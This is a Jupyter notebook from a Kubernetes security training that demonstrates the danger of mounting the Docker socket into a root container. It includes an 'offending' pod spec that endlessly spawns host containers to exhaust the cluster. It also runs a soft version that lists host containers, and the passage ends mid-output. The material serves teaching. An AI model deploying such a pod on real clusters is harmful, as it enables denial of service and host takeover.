{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**This notebook covered by the following [license](License.ipynb)  This note must not be removed**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Cloudbomb\n",
    "\n",
    "\n",
    "## Purpose\n",
    "\n",
    "It is shown, how dangerous it is \n",
    "\n",
    "* to start an image from an untrusted source\n",
    "* with __root privileges__\n",
    "* and __access to the host file system__\n",
    "\n",
    "This examples destroys the cluster step by step. \n",
    "\n",
    "It is a dangerous example, turned _s l o w_ for didactic purposes.\n",
    "\n",
    "It can even be made more disruptive easily.\n",
    "\n",
    "Don't put images like this into public registries.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Create an empty directory and change into"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "mkdir -p cloudbomb\n",
    "cd cloudbomb"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/minikube-host/notebooks/training-kubernetes-security/cloudbomb\n"
     ]
    }
   ],
   "source": [
    "pwd"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Get Docker\n",
    "\n",
    "See the latest statically linked versions here\n",
    "https://download.docker.com/linux/static/stable/x86_64/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n",
      "                                 Dload  Upload   Total   Spent    Left  Speed\n",
      "100 60.7M  100 60.7M    0     0  11.1M      0  0:00:05  0:00:05 --:--:-- 11.7M\n"
     ]
    }
   ],
   "source": [
    "curl https://download.docker.com/linux/static/stable/x86_64/docker-19.03.8.tgz -o docker.tgz"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "docker/\n",
      "docker/containerd\n",
      "docker/docker\n",
      "docker/ctr\n",
      "docker/dockerd\n",
      "docker/runc\n",
      "docker/docker-proxy\n",
      "docker/docker-init\n",
      "docker/containerd-shim\n"
     ]
    }
   ],
   "source": [
    "tar tzf docker.tgz"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/minikube-host/notebooks/training-kubernetes-security/cloudbomb\n"
     ]
    }
   ],
   "source": [
    "pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "tar xzf docker.tgz"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Create the Dockerfile\n",
    "\n",
    "and build the image **inside minikube**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "FROM alpine\n",
      "\n",
      "COPY docker/docker /usr/bin\n",
      "\n",
      "CMD [\"docker\", \"ps\"]\n"
     ]
    }
   ],
   "source": [
    "cat > Dockerfile <<EOF\n",
    "FROM alpine\n",
    "\n",
    "COPY docker/docker /usr/bin\n",
    "\n",
    "CMD [\"docker\", \"ps\"]\n",
    "EOF\n",
    "cat Dockerfile"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "REPOSITORY                                TAG       IMAGE ID       CREATED        SIZE\n",
      "nginx                                     latest    ea335eea17ab   13 days ago    141MB\n",
      "nginxinc/nginx-unprivileged               latest    197ced34802c   2 weeks ago    141MB\n",
      "k8s.gcr.io/kube-apiserver                 v1.22.2   e64579b7d886   2 months ago   128MB\n",
      "k8s.gcr.io/kube-controller-manager        v1.22.2   5425bcbd23c5   2 months ago   122MB\n",
      "k8s.gcr.io/kube-scheduler                 v1.22.2   b51ddc1014b0   2 months ago   52.7MB\n",
      "k8s.gcr.io/kube-proxy                     v1.22.2   873127efbc8a   2 months ago   104MB\n",
      "kubernetesui/dashboard                    v2.3.1    e1482a24335a   5 months ago   220MB\n",
      "k8s.gcr.io/etcd                           3.5.0-0   004811815584   5 months ago   295MB\n",
      "kubernetesui/metrics-scraper              v1.0.7    7801cfc6d5c0   5 months ago   34.4MB\n",
      "k8s.gcr.io/coredns/coredns                v1.8.4    8d147537fb7d   6 months ago   47.6MB\n",
      "gcr.io/k8s-minikube/storage-provisioner   v5        6e38f40d628d   8 months ago   31.5MB\n",
      "k8s.gcr.io/pause                          3.5       ed210e3e4a5b   8 months ago   683kB\n"
     ]
    }
   ],
   "source": [
    "docker images"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Sending build context to Docker daemon  274.7MB\n",
      "Step 1/3 : FROM alpine\n",
      "latest: Pulling from library/alpine\n",
      "\n",
      "\u001b[1BDigest: sha256:21a3deaa0d32a8057914f36584b5288d2e5ecc984380bc0118285c70fa8c9300\n",
      "Status: Downloaded newer image for alpine:latest\n",
      " ---> c059bfaa849c\n",
      "Step 2/3 : COPY docker/docker /usr/bin\n",
      " ---> e8c9bc123150\n",
      "Step 3/3 : CMD [\"docker\", \"ps\"]\n",
      " ---> Running in b90c51f3c1bc\n",
      "Removing intermediate container b90c51f3c1bc\n",
      " ---> 0fa6bb93d0d3\n",
      "Successfully built 0fa6bb93d0d3\n",
      "Successfully tagged cloudbomb:latest\n"
     ]
    }
   ],
   "source": [
    "docker build . -t cloudbomb"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Check the images\n",
    "\n",
    "`grep -E ... ` is only for colouring "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "REPOSITORY                                TAG       IMAGE ID       CREATED         SIZE\n",
      "\u001b[01;31m\u001b[Kcloudbomb                                 latest    0fa6bb93d0d3   2 minutes ago   71.4MB\u001b[m\u001b[K\n",
      "alpine                                    latest    c059bfaa849c   5 days ago      5.59MB\n",
      "nginx                                     latest    ea335eea17ab   13 days ago     141MB\n",
      "nginxinc/nginx-unprivileged               latest    197ced34802c   2 weeks ago     141MB\n",
      "k8s.gcr.io/kube-apiserver                 v1.22.2   e64579b7d886   2 months ago    128MB\n",
      "k8s.gcr.io/kube-controller-manager        v1.22.2   5425bcbd23c5   2 months ago    122MB\n",
      "k8s.gcr.io/kube-scheduler                 v1.22.2   b51ddc1014b0   2 months ago    52.7MB\n",
      "k8s.gcr.io/kube-proxy                     v1.22.2   873127efbc8a   2 months ago    104MB\n",
      "kubernetesui/dashboard                    v2.3.1    e1482a24335a   5 months ago    220MB\n",
      "k8s.gcr.io/etcd                           3.5.0-0   004811815584   5 months ago    295MB\n",
      "kubernetesui/metrics-scraper              v1.0.7    7801cfc6d5c0   5 months ago    34.4MB\n",
      "k8s.gcr.io/coredns/coredns                v1.8.4    8d147537fb7d   6 months ago    47.6MB\n",
      "gcr.io/k8s-minikube/storage-provisioner   v5        6e38f40d628d   8 months ago    31.5MB\n",
      "k8s.gcr.io/pause                          3.5       ed210e3e4a5b   8 months ago    683kB\n"
     ]
    }
   ],
   "source": [
    "docker images | grep --color=always -E '$|cloudbomb.*$' "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Create the Cloudbomb Pod\n",
    "\n",
    "* it is mounting the Docker socket `/var/run/docker.sock` into the container, we have `hostPath` rights\n",
    "* the `docker` process is running as `root`\n",
    "* **Gotcha**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Offending version, don't use\n",
    "\n",
    "```yaml\n",
    "apiVersion: v1\n",
    "kind: Pod\n",
    "metadata:\n",
    "  name: cloudbomb \n",
    "spec:\n",
    "  containers:\n",
    "  - image: cloudbomb\n",
    "    imagePullPolicy: IfNotPresent\n",
    "    command:\n",
    "      - /bin/sh\n",
    "      - \"-c\" \n",
    "      - \"while true; \\\n",
    "           do \\   \n",
    "             docker run -d --name BOOM_\\$(cat /dev/urandom | \\\n",
    "             tr -cd 'a-f0-9' | \\\n",
    "             head -c 6) nginx ; \\\n",
    "             sleep 10 ; \\\n",
    "           done\"\n",
    "    name: cloudbomb\n",
    "    volumeMounts:\n",
    "    - mountPath: /var/run/docker.sock\n",
    "      name: docker-socket\n",
    "  volumes:\n",
    "  - name: docker-socket\n",
    "    hostPath:\n",
    "      path: /var/run/docker.sock\n",
    "      type: Socket\n",
    "```\n",
    "\n",
    "# Soft version"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "pod/cloudbomb created\n"
     ]
    }
   ],
   "source": [
    "kubectl create -f - <<EOF\n",
    "apiVersion: v1\n",
    "kind: Pod\n",
    "metadata:\n",
    "  name: cloudbomb \n",
    "spec:\n",
    "  containers:\n",
    "  - image: cloudbomb\n",
    "    imagePullPolicy: IfNotPresent\n",
    "    command:\n",
    "      - /bin/sh\n",
    "      - \"-c\" \n",
    "      - \"while true; \\\n",
    "           do \\   \n",
    "             docker ps ; \\\n",
    "             sleep 10 ; \\\n",
    "           done\"\n",
    "    name: cloudbomb\n",
    "    volumeMounts:\n",
    "    - mountPath: /var/run/docker.sock\n",
    "      name: docker-socket\n",
    "  volumes:\n",
    "  - name: docker-socket\n",
    "    hostPath:\n",
    "      path: /var/run/docker.sock\n",
    "      type: Socket\n",
    "EOF"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "NAME                            READY   STATUS    RESTARTS   AGE\n",
      "cloudbomb                       1/1     Running   0          4s\n",
      "nginx-strict-5cdc48cf55-5gzxm   1/1     Running   0          54m\n",
      "nginx-strict-5cdc48cf55-lxc8w   1/1     Running   0          54m\n",
      "nginx-strict-5cdc48cf55-wwqhs   1/1     Running   0          54m\n"
     ]
    }
   ],
   "source": [
    "kubectl get pods"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "pod/cloudbomb condition met\n"
     ]
    }
   ],
   "source": [
    "kubectl wait --for=condition=ready --timeout=10s pod/cloudbomb"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "NAME                            READY   STATUS    RESTARTS   AGE\n",
      "cloudbomb                       1/1     Running   0          6s\n",
      "nginx-strict-5cdc48cf55-f5r5l   1/1     Running   0          3h45m\n",
      "nginx-strict-5cdc48cf55-v72v5   1/1     Running   0          3h45m\n",
      "nginx-strict-5cdc48cf55-xkh98   1/1     Running   0          3h45m\n"
     ]
    }
   ],
   "source": [
    "kubectl get pods"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {
    "collapsed": true,
    "jupyter": {
     "outputs_hidden": true
    },
    "tags": []
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "CONTAINER ID        IMAGE                         COMMAND                  CREATED                  STATUS                  PORTS               NAMES\n",
      "9262dd397bc2        0fa6bb93d0d3                  \"/bin/sh -c 'while t…\"   Less than a second ago   Up Less than a second                       k8s_cloudbomb_cloudbomb_default_91a424dd-9a79-47dc-a939-f0d80b6e23ac_0\n",
      "287b97245b66        k8s.gcr.io/pause:3.5          \"/pause\"                 Less than a second ago   Up Less than a second                       k8s_POD_cloudbomb_default_91a424dd-9a79-47dc-a939-f0d80b6e23ac_0\n",
      "30e8fbea03ed        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   54 minutes ago           Up 54 minutes                               k8s_nginx_nginx-strict-5cdc48cf55-lxc8w_default_a770a53d-4f08-4e4d-9ab8-9f90b21efe06_0\n",
      "e8f2365a91c4        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   54 minutes ago           Up 54 minutes                               k8s_nginx_nginx-strict-5cdc48cf55-5gzxm_default_58a0653d-f423-413e-aa70-62c5f82b6b9d_0\n",
      "4cc66f2b2f06        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   54 minutes ago           Up 54 minutes                               k8s_nginx_nginx-strict-5cdc48cf55-wwqhs_default_9d0404a6-c607-4c99-87f2-b1510678d51d_0\n",
      "a1bcbbaf5301        k8s.gcr.io/pause:3.5          \"/pause\"                 54 minutes ago           Up 54 minutes                               k8s_POD_nginx-strict-5cdc48cf55-5gzxm_default_58a0653d-f423-413e-aa70-62c5f82b6b9d_0\n",
      "591580bd91f1        k8s.gcr.io/pause:3.5          \"/pause\"                 54 minutes ago           Up 54 minutes                               k8s_POD_nginx-strict-5cdc48cf55-lxc8w_default_a770a53d-4f08-4e4d-9ab8-9f90b21efe06_0\n",
      "5712a32ddb12        k8s.gcr.io/pause:3.5          \"/pause\"                 54 minutes ago           Up 54 minutes                               k8s_POD_nginx-strict-5cdc48cf55-wwqhs_default_9d0404a6-c607-4c99-87f2-b1510678d51d_0\n",
      "612d18f433bd        6e38f40d628d                  \"/storage-provisioner\"   6 hours ago              Up 6 hours                                  k8s_storage-provisioner_storage-provisioner_kube-system_b147672e-36fd-42d8-a691-2c3896f0f43b_0\n",
      "65793eecdde3        8d147537fb7d                  \"/coredns -conf /etc…\"   6 hours ago              Up 6 hours                                  k8s_coredns_coredns-78fcd69978-jtj8x_kube-system_e01e0c8b-f513-4822-983a-264e8326eeb1_0\n",
      "f915b870ee6b        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago              Up 6 hours                                  k8s_POD_storage-provisioner_kube-system_b147672e-36fd-42d8-a691-2c3896f0f43b_0\n",
      "72c6ee947db8        873127efbc8a                  \"/usr/local/bin/kube…\"   6 hours ago              Up 6 hours                                  k8s_kube-proxy_kube-proxy-7zcnf_kube-system_89a16e01-0d20-4a29-b0a6-61dd2b391017_0\n",
      "ed853a4bf5d0        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago              Up 6 hours                                  k8s_POD_coredns-78fcd69978-jtj8x_kube-system_e01e0c8b-f513-4822-983a-264e8326eeb1_0\n",
      "cfa9996f98c4        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago              Up 6 hours                                  k8s_POD_kube-proxy-7zcnf_kube-system_89a16e01-0d20-4a29-b0a6-61dd2b391017_0\n",
      "b3473922bbe4        5425bcbd23c5                  \"kube-controller-man…\"   6 hours ago              Up 6 hours                                  k8s_kube-controller-manager_kube-controller-manager-minikube_kube-system_4787f37e041fd890d5499a8863561e5f_0\n",
      "fc75fd7aba15        004811815584                  \"etcd --advertise-cl…\"   6 hours ago              Up 6 hours                                  k8s_etcd_etcd-minikube_kube-system_08a3871e1baa241b73e5af01a6d01393_0\n",
      "3cab011b2934        b51ddc1014b0                  \"kube-scheduler --au…\"   6 hours ago              Up 6 hours                                  k8s_kube-scheduler_kube-scheduler-minikube_kube-system_97bca4cd66281ad2157a6a68956c4fa5_0\n",
      "c305e0932e5a        e64579b7d886                  \"kube-apiserver --ad…\"   6 hours ago              Up 6 hours                                  k8s_kube-apiserver_kube-apiserver-minikube_kube-system_fe49842e48a1ca6bac988e8ba88ecc53_0\n",
      "fd8093a82c02        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago              Up 6 hours                                  k8s_POD_kube-scheduler-minikube_kube-system_97bca4cd66281ad2157a6a68956c4fa5_0\n",
      "b2787fd72074        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago              Up 6 hours                                  k8s_POD_kube-controller-manager-minikube_kube-system_4787f37e041fd890d5499a8863561e5f_0\n",
      "654ee9f65305        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago              Up 6 hours                                  k8s_POD_kube-apiserver-minikube_kube-system_fe49842e48a1ca6bac988e8ba88ecc53_0\n",
      "286180e64eaa        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago              Up 6 hours                                  k8s_POD_etcd-minikube_kube-system_08a3871e1baa241b73e5af01a6d01393_0\n",
      "CONTAINER ID        IMAGE                         COMMAND                  CREATED             STATUS              PORTS               NAMES\n",
      "9262dd397bc2        0fa6bb93d0d3                  \"/bin/sh -c 'while t…\"   10 seconds ago      Up 10 seconds                           k8s_cloudbomb_cloudbomb_default_91a424dd-9a79-47dc-a939-f0d80b6e23ac_0\n",
      "287b97245b66        k8s.gcr.io/pause:3.5          \"/pause\"                 10 seconds ago      Up 10 seconds                           k8s_POD_cloudbomb_default_91a424dd-9a79-47dc-a939-f0d80b6e23ac_0\n",
      "30e8fbea03ed        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   54 minutes ago      Up 54 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-lxc8w_default_a770a53d-4f08-4e4d-9ab8-9f90b21efe06_0\n",
      "e8f2365a91c4        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   54 minutes ago      Up 54 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-5gzxm_default_58a0653d-f423-413e-aa70-62c5f82b6b9d_0\n",
      "4cc66f2b2f06        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   54 minutes ago      Up 54 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-wwqhs_default_9d0404a6-c607-4c99-87f2-b1510678d51d_0\n",
      "a1bcbbaf5301        k8s.gcr.io/pause:3.5          \"/pause\"                 54 minutes ago      Up 54 minutes                           k8s_POD_nginx-strict-5cdc48cf55-5gzxm_default_58a0653d-f423-413e-aa70-62c5f82b6b9d_0\n",
      "591580bd91f1        k8s.gcr.io/pause:3.5          \"/pause\"                 54 minutes ago      Up 54 minutes                           k8s_POD_nginx-strict-5cdc48cf55-lxc8w_default_a770a53d-4f08-4e4d-9ab8-9f90b21efe06_0\n",
      "5712a32ddb12        k8s.gcr.io/pause:3.5          \"/pause\"                 54 minutes ago      Up 54 minutes                           k8s_POD_nginx-strict-5cdc48cf55-wwqhs_default_9d0404a6-c607-4c99-87f2-b1510678d51d_0\n",
      "612d18f433bd        6e38f40d628d                  \"/storage-provisioner\"   6 hours ago         Up 6 hours                              k8s_storage-provisioner_storage-provisioner_kube-system_b147672e-36fd-42d8-a691-2c3896f0f43b_0\n",
      "65793eecdde3        8d147537fb7d                  \"/coredns -conf /etc…\"   6 hours ago         Up 6 hours                              k8s_coredns_coredns-78fcd69978-jtj8x_kube-system_e01e0c8b-f513-4822-983a-264e8326eeb1_0\n",
      "f915b870ee6b        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_storage-provisioner_kube-system_b147672e-36fd-42d8-a691-2c3896f0f43b_0\n",
      "72c6ee947db8        873127efbc8a                  \"/usr/local/bin/kube…\"   6 hours ago         Up 6 hours                              k8s_kube-proxy_kube-proxy-7zcnf_kube-system_89a16e01-0d20-4a29-b0a6-61dd2b391017_0\n",
      "ed853a4bf5d0        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_coredns-78fcd69978-jtj8x_kube-system_e01e0c8b-f513-4822-983a-264e8326eeb1_0\n",
      "cfa9996f98c4        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_kube-proxy-7zcnf_kube-system_89a16e01-0d20-4a29-b0a6-61dd2b391017_0\n",
      "b3473922bbe4        5425bcbd23c5                  \"kube-controller-man…\"   6 hours ago         Up 6 hours                              k8s_kube-controller-manager_kube-controller-manager-minikube_kube-system_4787f37e041fd890d5499a8863561e5f_0\n",
      "fc75fd7aba15        004811815584                  \"etcd --advertise-cl…\"   6 hours ago         Up 6 hours                              k8s_etcd_etcd-minikube_kube-system_08a3871e1baa241b73e5af01a6d01393_0\n",
      "3cab011b2934        b51ddc1014b0                  \"kube-scheduler --au…\"   6 hours ago         Up 6 hours                              k8s_kube-scheduler_kube-scheduler-minikube_kube-system_97bca4cd66281ad2157a6a68956c4fa5_0\n",
      "c305e0932e5a        e64579b7d886                  \"kube-apiserver --ad…\"   6 hours ago         Up 6 hours                              k8s_kube-apiserver_kube-apiserver-minikube_kube-system_fe49842e48a1ca6bac988e8ba88ecc53_0\n",
      "fd8093a82c02        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_kube-scheduler-minikube_kube-system_97bca4cd66281ad2157a6a68956c4fa5_0\n",
      "b2787fd72074        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_kube-controller-manager-minikube_kube-system_4787f37e041fd890d5499a8863561e5f_0\n",
      "654ee9f65305        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_kube-apiserver-minikube_kube-system_fe49842e48a1ca6bac988e8ba88ecc53_0\n",
      "286180e64eaa        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_etcd-minikube_kube-system_08a3871e1baa241b73e5af01a6d01393_0\n",
      "CONTAINER ID        IMAGE                         COMMAND                  CREATED             STATUS              PORTS               NAMES\n",
      "9262dd397bc2        0fa6bb93d0d3                  \"/bin/sh -c 'while t…\"   20 seconds ago      Up 20 seconds                           k8s_cloudbomb_cloudbomb_default_91a424dd-9a79-47dc-a939-f0d80b6e23ac_0\n",
      "287b97245b66        k8s.gcr.io/pause:3.5          \"/pause\"                 20 seconds ago      Up 20 seconds                           k8s_POD_cloudbomb_default_91a424dd-9a79-47dc-a939-f0d80b6e23ac_0\n",
      "30e8fbea03ed        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   54 minutes ago      Up 54 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-lxc8w_default_a770a53d-4f08-4e4d-9ab8-9f90b21efe06_0\n",
      "e8f2365a91c4        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   54 minutes ago      Up 54 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-5gzxm_default_58a0653d-f423-413e-aa70-62c5f82b6b9d_0\n",
      "4cc66f2b2f06        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   54 minutes ago      Up 54 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-wwqhs_default_9d0404a6-c607-4c99-87f2-b1510678d51d_0\n",
      "a1bcbbaf5301        k8s.gcr.io/pause:3.5          \"/pause\"                 55 minutes ago      Up 55 minutes                           k8s_POD_nginx-strict-5cdc48cf55-5gzxm_default_58a0653d-f423-413e-aa70-62c5f82b6b9d_0\n",
      "591580bd91f1        k8s.gcr.io/pause:3.5          \"/pause\"                 55 minutes ago      Up 55 minutes                           k8s_POD_nginx-strict-5cdc48cf55-lxc8w_default_a770a53d-4f08-4e4d-9ab8-9f90b21efe06_0\n",
      "5712a32ddb12        k8s.gcr.io/pause:3.5          \"/pause\"                 55 minutes ago      Up 55 minutes                           k8s_POD_nginx-strict-5cdc48cf55-wwqhs_default_9d0404a6-c607-4c99-87f2-b1510678d51d_0\n",
      "612d18f433bd        6e38f40d628d                  \"/storage-provisioner\"   6 hours ago         Up 6 hours                              k8s_storage-provisioner_storage-provisioner_kube-system_b147672e-36fd-42d8-a691-2c3896f0f43b_0\n",
      "65793eecdde3        8d147537fb7d                  \"/coredns -conf /etc…\"   6 hours ago         Up 6 hours                              k8s_coredns_coredns-78fcd69978-jtj8x_kube-system_e01e0c8b-f513-4822-983a-264e8326eeb1_0\n",
      "f915b870ee6b        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_storage-provisioner_kube-system_b147672e-36fd-42d8-a691-2c3896f0f43b_0\n",
      "72c6ee947db8        873127efbc8a                  \"/usr/local/bin/kube…\"   6 hours ago         Up 6 hours                              k8s_kube-proxy_kube-proxy-7zcnf_kube-system_89a16e01-0d20-4a29-b0a6-61dd2b391017_0\n",
      "ed853a4bf5d0        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_coredns-78fcd69978-jtj8x_kube-system_e01e0c8b-f513-4822-983a-264e8326eeb1_0\n",
      "cfa9996f98c4        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_kube-proxy-7zcnf_kube-system_89a16e01-0d20-4a29-b0a6-61dd2b391017_0\n",
      "b3473922bbe4        5425bcbd23c5                  \"kube-controller-man…\"   6 hours ago         Up 6 hours                              k8s_kube-controller-manager_kube-controller-manager-minikube_kube-system_4787f37e041fd890d5499a8863561e5f_0\n",
      "fc75fd7aba15        004811815584                  \"etcd --advertise-cl…\"   6 hours ago         Up 6 hours                              k8s_etcd_etcd-minikube_kube-system_08a3871e1baa241b73e5af01a6d01393_0\n",
      "3cab011b2934        b51ddc1014b0                  \"kube-scheduler --au…\"   6 hours ago         Up 6 hours                              k8s_kube-scheduler_kube-scheduler-minikube_kube-system_97bca4cd66281ad2157a6a68956c4fa5_0\n",
      "c305e0932e5a        e64579b7d886                  \"kube-apiserver --ad…\"   6 hours ago         Up 6 hours                              k8s_kube-apiserver_kube-apiserver-minikube_kube-system_fe49842e48a1ca6bac988e8ba88ecc53_0\n",
      "fd8093a82c02        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_kube-scheduler-minikube_kube-system_97bca4cd66281ad2157a6a68956c4fa5_0\n",
      "b2787fd72074        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_kube-controller-manager-minikube_kube-system_4787f37e041fd890d5499a8863561e5f_0\n",
      "654ee9f65305        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_kube-apiserver-minikube_kube-system_fe49842e48a1ca6bac988e8ba88ecc53_0\n",
      "286180e64eaa        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_etcd-minikube_kube-system_08a3871e1baa241b73e5af01a6d01393_0\n",
      "CONTAINER ID        IMAGE                         COMMAND                  CREATED             STATUS              PORTS               NAMES\n",
      "9262dd397bc2        0fa6bb93d0d3                  \"/bin/sh -c 'while t…\"   30 seconds ago      Up 30 seconds                           k8s_cloudbomb_cloudbomb_default_91a424dd-9a79-47dc-a939-f0d80b6e23ac_0\n",
      "287b97245b66        k8s.gcr.io/pause:3.5          \"/pause\"                 30 seconds ago      Up 30 seconds                           k8s_POD_cloudbomb_default_91a424dd-9a79-47dc-a939-f0d80b6e23ac_0\n",
      "30e8fbea03ed        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   54 minutes ago      Up 54 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-lxc8w_default_a770a53d-4f08-4e4d-9ab8-9f90b21efe06_0\n",
      "e8f2365a91c4        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   54 minutes ago      Up 54 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-5gzxm_default_58a0653d-f423-413e-aa70-62c5f82b6b9d_0\n",
      "4cc66f2b2f06        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   55 minutes ago      Up 55 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-wwqhs_default_9d0404a6-c607-4c99-87f2-b1510678d51d_0\n",
      "a1bcbbaf5301        k8s.gcr.io/pause:3.5          \"/pause\"                 55 minutes ago      Up 55 minutes                           k8s_POD_nginx-strict-5cdc48cf55-5gzxm_default_58a0653d-f423-413e-aa70-62c5f82b6b9d_0\n",
      "591580bd91f1        k8s.gcr.io/pause:3.5          \"/pause\"                 55 minutes ago      Up 55 minutes                           k8s_POD_nginx-strict-5cdc48cf55-lxc8w_default_a770a53d-4f08-4e4d-9ab8-9f90b21efe06_0\n",
      "5712a32ddb12        k8s.gcr.io/pause:3.5          \"/pause\"                 55 minutes ago      Up 55 minutes                           k8s_POD_nginx-strict-5cdc48cf55-wwqhs_default_9d0404a6-c607-4c99-87f2-b1510678d51d_0\n",
      "612d18f433bd        6e38f40d628d                  \"/storage-provisioner\"   6 hours ago         Up 6 hours                              k8s_storage-provisioner_storage-provisioner_kube-system_b147672e-36fd-42d8-a691-2c3896f0f43b_0\n",
      "65793eecdde3        8d147537fb7d                  \"/coredns -conf /etc…\"   6 hours ago         Up 6 hours                              k8s_coredns_coredns-78fcd69978-jtj8x_kube-system_e01e0c8b-f513-4822-983a-264e8326eeb1_0\n",
      "f915b870ee6b        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_storage-provisioner_kube-system_b147672e-36fd-42d8-a691-2c3896f0f43b_0\n",
      "72c6ee947db8        873127efbc8a                  \"/usr/local/bin/kube…\"   6 hours ago         Up 6 hours                              k8s_kube-proxy_kube-proxy-7zcnf_kube-system_89a16e01-0d20-4a29-b0a6-61dd2b391017_0\n",
      "ed853a4bf5d0        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_coredns-78fcd69978-jtj8x_kube-system_e01e0c8b-f513-4822-983a-264e8326eeb1_0\n",
      "cfa9996f98c4        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_kube-proxy-7zcnf_kube-system_89a16e01-0d20-4a29-b0a6-61dd2b391017_0\n",
